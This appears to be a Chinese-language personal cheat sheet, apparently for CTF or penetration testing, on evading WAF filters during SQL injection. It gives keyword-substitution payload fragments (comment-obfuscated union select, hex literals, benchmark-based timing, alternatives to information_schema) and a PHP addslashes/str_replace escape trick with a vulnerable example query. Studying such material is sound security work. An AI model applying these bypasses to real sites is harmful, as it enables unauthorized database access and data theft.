- > ~~反 waifu~~
- # 常见绕过手法
  id:: 65295f4e-bfcb-4286-a698-89181acb25d2
	- `or`和`and`
		- 使用`||`和`&&`代替
	- `information_schema`
		- `sys.schema_auto_increment_columns`
		- `select table_name from mysql.innodb_table_stats where database_name = database();`
		- `mysql.innodb_table_stats`
		- `(select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer))`
		- [参考](https://www.jianshu.com/p/5aad090eb613)
	- `=`
		- 使用`like`或者`regexp`代替
	- 空格等
		- 使用`()`即`select(flag)from(xxx)`进行代替
			- 版本太低时无法使用
		- 使用`/**/`或者`<>`代替
		- `and 1=1` --> `and!!1=1`
		- `payload.replace(' ', chr(0x0b))`
			- mysql可用
	- `#`和`-`
		- 构造`||'`去闭合最后的`'`
	- `/*`
		- 使用`#\n`
	- `substr`
		- 试试`substring`
		- 可以使用`mid`代替
			- `mid(('ahahaha')from(1)for(3))`
		- 试试`left`和`right`
			- `right(left(TARGET,POSITION),1)`
	- 各类关键词（如`medium`）
		- 可以使用十六进制`0x6d656469756d`代替
		- `SELECT 'a' 'd' 'mi' 'n';`
		- `SELECT CONCAT('a', 'd', 'm', 'i', 'n');`
	- `^`
		- 可使用`$`来从后往前进行匹配
	- `where`
		- 可以使用 having
	- `select`
		- `table`
		- `handler`
	- `if`
		- `select case when (条件) then 代码1 else 代码 2 end`
		- `IFNULL()` ,  `NULLIF()`
	- `union select`
		- `union all select`
		- 注释
			- `union/**/select`
			- 单行注释配合换行
				- `union #\nselect`
			- `union/*!/*!10000select*/`
			-
	- `sleep`
		- `benchmark(10000000,sha(1))`
		- 利用[[regex/ddos]]卡时间，达到和sleep相同的效果
	- 引号
		- `/*!0x2e2a3fe6ada2e8a1802e2a3f*/`
		- ^^`/*!*/`  意为在xxx版本之上执行^^
- # 绕过 addslashes
	- ```php
	  $id=addslashes($id);
	  $path=addslashes($path);
	  
	  $id=str_replace(array("\\0","%00","\\'","'"),"",$id);
	  $path=str_replace(array("\\0","%00","\\'","'"),"",$path);
	  
	  $result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
	  ```
	  
	  使用`\0`可以消除单引号
	  
	  `\0'` -> `\\0'` -> `\'`
	  
	  因此，只要让`$id`为`\0`就可以让`$path`逃逸
	  
	  > 在处理字符串时，mysql 并不是逐字符解析的（因为还要考虑反引号），但是 addslash 加 str_replace 是逐字符解析的，这就造成了漏洞
	  >
	  > 举例：解析`1a\0'`
	  >
	  > `1 a \ 0 '` -> `1 a \\ 0 \' `(本应这么解析) -> `1 a \ \0 \'` -> `1 a \\'` -> `1 a`
- # 安全狗
	- [[SQL注入/绕过商业WAF]]